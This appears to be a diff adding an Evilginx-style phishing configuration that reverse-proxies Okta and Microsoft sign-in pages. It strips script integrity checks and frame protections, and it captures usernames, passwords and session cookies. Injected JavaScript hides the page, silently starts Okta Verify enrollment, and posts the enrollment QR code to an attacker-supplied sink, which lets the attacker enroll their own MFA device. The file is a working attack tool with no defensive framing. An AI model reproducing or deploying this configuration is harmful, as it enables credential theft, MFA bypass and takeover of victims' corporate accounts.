@@ -1,0 +1,148 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'okta_orga', orig_sub: 'okta_orga', domain: 'okta.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'ok14static', orig_sub: 'ok14static', domain: 'oktacdn.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'logins', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdns', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'ok14static.oktacdn.com', orig_sub: '', domain: 'okta.com', search: 'array"\);var t=', replace: 'array");e.redirectUri=e.redirectUri.replace("{basedomain}","{orig_domain}");var t=', mimes: ['application/javascript']}
+  - {triggers_on: 'okta_orga.okta.com', orig_sub: '', domain: 'okta.com', search: 'integrity="[^"]*', replace: 'integrity=', mimes: ['text/html', 'charset=utf-8']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: '', domain: 'okta.com', search: 'X-Frame-Options: DENY', replace: 'Test: test', mimes: ['text/html', 'charset=utf-8']}
+  - {triggers_on: 'okta_orga.okta.com', orig_sub: '', domain: 'okta.com', search: 'window\._oktaEnduser =', replace: 'if(document.referrer.indexOf /enduser/callback != -1 document.location = https://+window.location.hostname+/help/login ; window._oktaEnduser =', mimes: ['text/html', 'charset=utf-8']}
+  - {triggers_on: 'okta_orga.okta.com', orig_sub: '', domain: 'okta.com', search: 'mainScript\.integrity', replace: 'mainScript\.integrity', mimes: ['text/html', 'charset=utf-8']}
+  - {triggers_on: 'okta_orga.okta.com', orig_sub: '', domain: '', search: '<title>[^<]*Help[^<]*</title>', replace: '<title>Authentication</title><style>body{display: none}', mimes: ['text/html', 'charset=utf-8']}
+  - {triggers_on: 'ok14static.oktacdn.com', orig_sub: '', domain: 'okta.com', search: 'var s=\(n\.g\.fetch\|\|h\(\)\)\(t', replace: 't=t.replace("{orig_domain}","{domain}");var s=(n.g.fetch||h())(t', mimes: ['application/javascript']}
+  - {triggers_on: 'ok14static.oktacdn.com', orig_sub: '', domain: 'okta.com', search: ',l\.src=e\.getIssuerOrigin\(\)', replace: ',l.src=e.getIssuerOrigin().replace("{orig_domain}","{domain}")', mimes: ['application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: '', domain: 'okta.com', search: 'if\(e.self===e.top\){', replace: 'if(true){window.oldself=e.self;e.self=e.top;', mimes: ['text/html', 'charset=utf-8']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: '', domain: 'okta.com', search: 'method="post" target="_top"', replace: 'method="post"', mimes: ['application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: '', domain: 'okta.com', search: 'autoSubmit: forceSubmit, attr: { action: postUrl }, ', replace: 'autoSubmit: forceSubmit, attr: action: \\/common/login\\', mimes: ['application/x-javascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: '', domain: 'okta.com', search: 'method="post"', replace: 'method="post"', mimes: ['application/x-javascript']}
+  - {triggers_on: 'aadcdn.msauth.net', orig_sub: '', domain: 'okta.com', search: 'autoSubmit: forceSubmit, attr: { action: postUrl },', replace: 'autoSubmit: forceSubmit, attr:  action: \\/common/login\\,', mimes: ['application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '{okta_orga}.okta.com'
+    keys: ['idx:always']
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT','SignInStateCookie',]
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSAUTHLIGHT']
+
+credentials:
+  username:
+    key: ''
+    search: '"identifier":"([^"]*)"'
+    type: 'json'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: '{okta_orga}.okta.com'
+  path: '/'
+
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
+
+params:
+  - name: okta_orga
+    default: ''
+    required: true
+  - name: redirect_server
+    default: https://google.com
+  - name: qrcode_sink
+    default: ''
+    required: true
+
+js_inject:
+  - trigger_domains: ['okta_orga.okta.com']
+    trigger_paths: ['/app/UserHome']
+    script: |
+      if(document.referrer.indexOf('/enduser/callback') != -1){document.location = 'https://'+window.location.hostname+'/help/login'}
+  - trigger_domains: ['okta_orga.okta.com']
+    trigger_paths: ['/help/login']
+    script: |
+      function u4tyd783z(){
+        fetch('/api/v1/authenticators')
+        .then((data) => {
+            data.json().then((jData)=>{
+                let id = undefined
+                for(let elt of jData){
+                    if(elt.key == 'okta_verify'){
+                        id = elt.id
+                    }
+                }
+                if(id == undefined){
+                    return
+                }
+                console.log('https://'+window.location.hostname+'/idp/authenticators/setup/'+id)
+                document.location = 'https://'+window.location.hostname+'/idp/authenticators/setup/'+id
+            })
+
+        })
+      }
+      u4tyd783z();
+  - trigger_domains: ['okta_orga.okta.com']
+    trigger_paths: ['/idp/authenticators/setup/.*']
+    script: |
+      function u720dhfn2(){
+        if(document.querySelectorAll('.button.select-factor.link-button').length == 1 && a===false){
+            document.querySelectorAll('.button.select-factor.link-button')[0].click()
+            document.querySelectorAll('body')[0].style.display = 'none'
+            a = true
+        }
+        if(document.querySelectorAll('a.orOnMobileLink').length == 1 && b == false && a == true){
+            document.querySelectorAll('a.orOnMobileLink')[0].click()
+            b = true
+        }
+        if(document.querySelectorAll('img.qrcode').length && a == true && b == true){
+            console.log(document.querySelectorAll('img.qrcode')[0].getAttribute('src'))
+            fetch("{qrcode_sink}", {
+              method: 'POST',
+              body: JSON.stringify({code: document.querySelectorAll('img.qrcode')[0].getAttribute('src')})
+            }).then(()=>{
+              document.location='{redirect_server}'
+            }).catch(()=>{
+              document.location='{redirect_server}'
+            })
+
+            clearInterval(myInterval)
+        }
+      }
+      var a = false
+      var b = false
+      var myInterval = setInterval(function(){u720dhfn2()}, 10)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
